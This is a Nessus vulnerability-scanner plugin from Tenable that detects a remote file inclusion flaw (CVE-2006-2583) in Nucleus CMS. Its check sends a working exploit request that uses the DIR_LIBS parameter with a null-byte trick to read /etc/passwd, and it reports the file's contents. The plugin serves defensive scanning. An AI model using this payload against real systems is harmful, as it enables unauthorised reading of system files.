#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote web server contains a PHP script that is prone to remote
file inclusion attacks. 

Description :

The remote host is running Nucleus CMS, an open-source content
management system. 

The version of Nucleus CMS installed on the remote host fails to
sanitize input to the 'DIR_LIBS' parameter before using it in a PHP
include() function in the 'nucleus/libs/PLUGINADMIN.php' script. 
Provided PHP's 'register_globals' setting is enabled, an
unauthenticated attacker may be able to exploit this flaw to view
arbitrary files on the remote host or to execute arbitrary PHP code,
possibly taken from third-party hosts. 

See also :

http://www.securityfocus.com/archive/1/434837/30/0/threaded
http://www.nucleuscms.org/item/3038

Solution :

Upgrade to Nucleus version 3.23 or later.

Risk factor :

Medium / CVSS Base Score : 6 
(AV:R/AC:H/Au:NR/C:P/A:P/I:P/B:N)";


if (description)
{
  script_id(21596);
  script_version("$Revision: 1.3 $");

  script_cve_id("CVE-2006-2583");
  script_bugtraq_id(18097);

  script_name(english:"Nucleus CMS DIR_LIBS Parameter Remote File Include Vulnerability");
  script_summary(english:"Tries to read a local file using Nucleus CMS");

  script_description(english:desc);

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through various directories.
if (thorough_tests) dirs = make_list("/nucleus", "/blog", cgi_dirs());
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Try to exploit the flaw to read a file.
  file = "/etc/passwd%00";
  req = http_get(
    item:string(
      dir, "/nucleus/libs/PLUGINADMIN.php?",
      "GLOBALS[DIR_LIBS]=", file
    ), 
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem if...
  if (
    # there's an entry for root or...
    egrep(pattern:"root:.*:0:[01]:", string:res) ||
    # we get an error saying "failed to open stream".
    egrep(pattern:"main\(/etc/passwd\\0ADMIN\.php.+ failed to open stream", string:res) ||
    # we get an error claiming the file doesn't exist or...
    egrep(pattern:"main\(/etc/passwd\).*: failed to open stream: No such file or directory", string:res) ||
    # we get an error about open_basedir restriction.
    egrep(pattern:"main.+ open_basedir restriction in effect. File\(/etc/passwd", string:res)
  )
  {
    if (egrep(string:res, pattern:"root:.*:0:[01]:"))
      report = string(
        desc,
        "\n\n",
        "Plugin output :\n",
        "\n",
        "Here are the contents of the file '/etc/passwd' that Nessus\n",
        "was able to read from the remote host :\n",
        "\n",
        res
      );
    else report = desc;

    security_warning(port:port, data:report);
    exit(0);
  }
}
